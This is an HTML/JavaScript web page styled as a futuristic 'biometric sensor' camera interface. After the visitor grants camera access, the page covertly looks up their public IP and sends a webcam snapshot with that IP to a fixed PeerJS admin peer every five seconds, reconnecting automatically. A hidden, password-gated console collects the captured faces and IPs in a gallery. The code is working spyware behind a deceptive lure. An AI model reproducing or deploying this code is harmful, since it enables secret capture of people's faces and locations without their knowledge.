<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>FX_PRO_SYSTEM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --accent: #3b82f6; --admin-accent: #22c55e; }
        body { overscroll-behavior: none; background: #000; touch-action: manipulation; }
        .scanline {
            width: 100%; height: 2px;
            background: rgba(59, 130, 246, 0.4);
            position: absolute; z-index: 10;
            animation: scan 3s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        #logData::-webkit-scrollbar { width: 3px; }
        #logData::-webkit-scrollbar-thumb { background: #065f46; }
        .terminal-input {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #065f46;
            color: var(--admin-accent);
            padding: 14px;
            text-align: center;
            font-family: monospace;
            letter-spacing: 0.2em;
            outline: none;
            transition: border-color 0.3s;
        }
        .terminal-input:focus { border-color: var(--admin-accent); }
        
        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus {
            -webkit-text-fill-color: var(--admin-accent);
            -webkit-box-shadow: 0 0 0px 1000px #000 inset;
            transition: background-color 5000s ease-in-out 0s;
        }
    </style>
</head>
<body class="text-zinc-100 min-h-screen flex flex-col font-mono overflow-hidden">

    <!-- Subtle Admin Toggle -->
    <div class="fixed top-4 right-4 z-50">
        <button id="toggleAdmin" class="bg-zinc-900/40 backdrop-blur-md px-4 py-2 rounded-full text-[10px] text-zinc-500 border border-zinc-800 uppercase tracking-widest active:scale-90 transition-transform">
            Console_Access
        </button>
    </div>

    <!-- MAIN INTERFACE -->
    <main id="userApp" class="relative flex-grow flex flex-col h-screen">
        <div class="relative flex-grow overflow-hidden flex items-center justify-center bg-black">
            <video id="videoFeed" autoplay playsinline muted class="w-full h-full object-cover grayscale opacity-60 transition-opacity duration-1000"></video>
            
            <div id="overlay" class="absolute inset-0 pointer-events-none border-[12px] border-blue-500/20 m-4 rounded-[2rem] md:rounded-[3rem] hidden"></div>
            <div id="scanner" class="scanline hidden"></div>
            
            <!-- Client Connection Status Indicator -->
            <div id="clientStatus" class="absolute top-8 left-0 right-0 text-center pointer-events-none hidden">
                <span class="bg-black/50 text-blue-400 text-[9px] px-3 py-1 rounded-full border border-blue-500/30 uppercase tracking-widest animate-pulse">
                    Connecting to Node...
                </span>
            </div>
            
            <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-950 px-8 text-center z-20">
                <div class="mb-8 text-blue-500">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-24 h-24 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="0.7" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                </div>
                <h1 class="text-2xl font-black mb-4 tracking-[0.3em] uppercase text-white">System_Auth</h1>
                <p class="text-zinc-500 text-[10px] mb-10 max-w-xs leading-loose uppercase tracking-widest">Biometric sensor initialization required for neural interface mapping.</p>
                <button id="startCam" class="bg-blue-600 active:bg-blue-700 text-white font-bold py-5 px-14 rounded-full transition-all text-[11px] uppercase tracking-[0.2em] shadow-2xl shadow-blue-500/20">
                    Authorize_Sensor
                </button>
            </div>
        </div>

        <div class="h-24 bg-zinc-950/80 backdrop-blur-xl border-t border-zinc-900 flex items-center justify-center gap-8 px-6 pb-safe">
            <div class="w-12 h-12 rounded-full border border-zinc-800 flex items-center justify-center grayscale opacity-30">ðŸ’€</div>
            <div id="captureTrigger" class="w-16 h-16 rounded-full border-2 border-blue-500 bg-blue-500/10 flex items-center justify-center text-3xl shadow-lg shadow-blue-500/10">ðŸ“¸</div>
            <div class="w-12 h-12 rounded-full border border-zinc-800 flex items-center justify-center grayscale opacity-30">ðŸ‘½</div>
        </div>
    </main>

    <!-- ADMIN CONSOLE -->
    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-[60] flex flex-col pt-safe">
        <div class="p-4 border-b border-green-900/50 flex justify-between items-center bg-zinc-950/50">
            <h2 class="text-sm font-bold text-green-500 uppercase tracking-[0.2em]">Secure_Terminal_v4.2</h2>
            <button id="closeAdmin" class="text-zinc-600 text-[10px] uppercase hover:text-white">Disconnect</button>
        </div>

        <div class="flex-grow flex flex-col p-4 overflow-hidden">
            <div id="adminAuth" class="flex-grow flex flex-col items-center justify-center space-y-6">
                <div class="text-green-900 text-[9px] tracking-[0.5em] uppercase animate-pulse">Waiting for credentials...</div>
                <input type="password" id="adminPass" autocomplete="new-password" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢" class="terminal-input w-full max-w-xs">
                <button id="loginBtn" class="bg-green-500/10 border border-green-500/50 text-green-500 px-12 py-3 text-[10px] uppercase tracking-[0.3em] hover:bg-green-500 hover:text-black transition-all">Execute_Login</button>
            </div>

            <div id="adminDashboard" class="hidden flex-grow flex flex-col gap-4 overflow-hidden">
                <div class="flex flex-col sm:flex-row justify-between sm:items-center bg-zinc-900/50 border border-green-900/30 p-3 rounded gap-2">
                    <span class="text-[9px] text-green-700 uppercase">Status: <span id="statusIndicator" class="text-green-500">Live_Uplink</span></span>
                    <span class="text-[9px] text-green-700 uppercase">Node: <span id="myPeerId" class="text-green-500">Connecting...</span></span>
                </div>

                <div class="flex-grow flex flex-col lg:grid lg:grid-cols-3 gap-4 overflow-hidden">
                    <div class="lg:col-span-1 bg-zinc-950 border border-green-900/30 p-4 rounded flex flex-col h-48 lg:h-full overflow-hidden">
                        <h3 class="text-green-500 mb-4 text-[9px] font-bold uppercase tracking-widest border-b border-green-900/30 pb-2">Traffic_Telemetry</h3>
                        <div id="logData" class="flex-grow overflow-y-auto space-y-2 text-[10px] text-green-700 font-mono">
                            <p class="opacity-50">> System ready for inbound packets.</p>
                        </div>
                    </div>

                    <div class="lg:col-span-2 bg-zinc-950 border border-green-900/30 p-4 rounded flex flex-col h-full overflow-hidden">
                        <h3 class="text-green-500 mb-4 text-[9px] font-bold uppercase tracking-widest border-b border-green-900/30 pb-2">Satellite_Buffer_Feed</h3>
                        <div id="captureGallery" class="flex-grow overflow-y-auto grid grid-cols-2 md:grid-cols-3 gap-3 content-start">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="offscreenCanvas" class="hidden"></canvas>

    <script>
        const video = document.getElementById('videoFeed');
        const startBtn = document.getElementById('startCam');
        const setupMsg = document.getElementById('setupMsg');
        const logData = document.getElementById('logData');
        const gallery = document.getElementById('captureGallery');
        const canvas = document.getElementById('offscreenCanvas');
        const adminAuth = document.getElementById('adminAuth');
        const adminDashboard = document.getElementById('adminDashboard');
        const adminPass = document.getElementById('adminPass');
        const clientStatus = document.getElementById('clientStatus');

        let peer;
        let isStreaming = false;
        let userIp = "REDACTED";
        // Using a reliable ID. If you change this, change it in both places.
        const ADMIN_PEER_ID = 'fx-master-stable-v4'; 
        let activeAdminConn = null;
        let frameInterval = null;

        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIp = data.ip;
            } catch (e) {
                userIp = "HIDDEN_" + Math.floor(Math.random() * 9000);
            }
        }

        function initPeer(asAdmin) {
            if (peer) peer.destroy();
            
            peer = new Peer(asAdmin ? ADMIN_PEER_ID : undefined, { 
                debug: 1,
                config: {'iceServers': [
                    { url: 'stun:stun.l.google.com:19302' },
                    { url: 'stun:stun1.l.google.com:19302' }
                ]}
            });

            peer.on('open', (id) => {
                document.getElementById('myPeerId').textContent = id;
                if (!asAdmin) {
                    clientStatus.classList.remove('hidden');
                    updateClientStatus("Searching for Admin...", "text-blue-400");
                    connectToAdmin();
                }
            });

            // ADMIN LOGIC
            peer.on('connection', (conn) => {
                conn.on('data', (data) => {
                    if (data.type === 'HEARTBEAT') {
                        addLog(`SIGNAL: [${data.ip}] NODE_${conn.peer.slice(-4).toUpperCase()}`);
                    }
                    if (data.type === 'FRAME') {
                        displayFrame(data.img, conn.peer, data.ip);
                    }
                });
                conn.on('open', () => {
                    addLog(`ACTIVE_UPLINK: ${conn.peer.slice(-6)}`);
                });
                conn.on('close', () => {
                    addLog(`LOST_UPLINK: ${conn.peer.slice(-6)}`);
                });
            });

            peer.on('error', (err) => {
                if(asAdmin && err.type === 'unavailable-id') {
                    addLog("ERR: Node ID in use. Wait 30s or refresh.");
                    document.getElementById('statusIndicator').textContent = "ID_CONFLICT";
                    document.getElementById('statusIndicator').className = "text-red-500";
                }
            });
        }

        // CLIENT LOGIC: Persistent Connection
        function connectToAdmin() {
            if (!peer || peer.destroyed) return;
            
            if (activeAdminConn && activeAdminConn.open) {
                return; // Already connected
            }

            const conn = peer.connect(ADMIN_PEER_ID, {
                reliable: true
            });

            conn.on('open', () => {
                activeAdminConn = conn;
                updateClientStatus("LINKED TO CONSOLE", "text-green-500");
                
                // Start sending frames immediately
                sendPacket(conn);
                
                // Clear any old interval
                if (frameInterval) clearInterval(frameInterval);
                
                // Set new interval for this specific connection
                frameInterval = setInterval(() => {
                    if (conn.open) {
                        sendPacket(conn);
                    } else {
                        clearInterval(frameInterval);
                    }
                }, 5000); // 5 seconds is safer for sustained connections
            });

            conn.on('close', () => {
                activeAdminConn = null;
                updateClientStatus("Link Lost. Retrying...", "text-orange-500");
                if (frameInterval) clearInterval(frameInterval);
                setTimeout(connectToAdmin, 3000);
            });

            conn.on('error', (err) => {
                activeAdminConn = null;
                updateClientStatus("Connection Error", "text-red-500");
                if (frameInterval) clearInterval(frameInterval);
                setTimeout(connectToAdmin, 5000);
            });
        }

        function updateClientStatus(text, colorClass) {
            const span = clientStatus.querySelector('span');
            span.textContent = text;
            span.className = `bg-black/50 ${colorClass} text-[9px] px-3 py-1 rounded-full border border-blue-500/30 uppercase tracking-widest`;
        }

        startBtn.onclick = async () => {
            try {
                await fetchIP();
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    setupMsg.classList.add('hidden');
                    document.getElementById('scanner').classList.remove('hidden');
                    document.getElementById('overlay').classList.remove('hidden');
                    video.classList.replace('opacity-60', 'opacity-100');
                    isStreaming = true;
                    initPeer(false); // Init as client
                };
            } catch (err) {
                alert("SENSOR_ERROR: Permission denied.");
            }
        };

        function sendPacket(conn) {
            if (!video.videoWidth) return;
            const ctx = canvas.getContext('2d');
            const size = 300; 
            canvas.width = size; canvas.height = size;
            ctx.drawImage(video, (video.videoWidth - video.videoHeight)/2, 0, video.videoHeight, video.videoHeight, 0, 0, size, size);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
            conn.send({ type: 'HEARTBEAT', ip: userIp });
            conn.send({ type: 'FRAME', img: dataUrl, ip: userIp });
        }

        // PASSWORD: 5502012
        document.getElementById('loginBtn').onclick = () => {
            if (adminPass.value === '5502012') {
                adminAuth.classList.add('hidden');
                adminDashboard.classList.remove('hidden');
                initPeer(true); // Init as Admin
            } else {
                adminPass.value = '';
                adminPass.placeholder = "ACCESS_DENIED";
                adminPass.classList.add('border-red-500');
                setTimeout(() => {
                    adminPass.classList.remove('border-red-500');
                    adminPass.placeholder = "â€¢â€¢â€¢â€¢â€¢â€¢â€¢";
                }, 1000);
            }
        };

        function displayFrame(url, sender, ip) {
            const container = document.createElement('div');
            container.className = "relative border border-green-500/20 rounded-lg overflow-hidden bg-zinc-900 shadow-xl";
            
            const img = document.createElement('img');
            img.src = url;
            img.className = "w-full aspect-square object-cover grayscale brightness-110 contrast-125";
            
            const label = document.createElement('div');
            label.className = "absolute bottom-0 left-0 right-0 bg-green-500/80 text-black text-[7px] font-black px-2 py-1 flex justify-between uppercase";
            label.innerHTML = `<span>IP: ${ip}</span><span>${sender.slice(-4)}</span>`;
            
            container.appendChild(img);
            container.appendChild(label);
            
            if (gallery.children.length > 21) gallery.removeChild(gallery.lastChild);
            gallery.prepend(container);
        }

        function addLog(msg) {
            const p = document.createElement('p');
            p.className = "border-l border-green-900/50 pl-2 py-1";
            p.textContent = `> [${new Date().toLocaleTimeString([], {hour12:false})}] ${msg}`;
            logData.prepend(p);
        }

        document.getElementById('toggleAdmin').onclick = () => {
            document.getElementById('adminPanel').classList.toggle('hidden');
            adminPass.value = "";
        };
        
        document.getElementById('closeAdmin').onclick = () => {
            document.getElementById('adminPanel').classList.add('hidden');
            if (peer && peer.id === ADMIN_PEER_ID) peer.destroy();
        };
    </script>
</body>
</html>
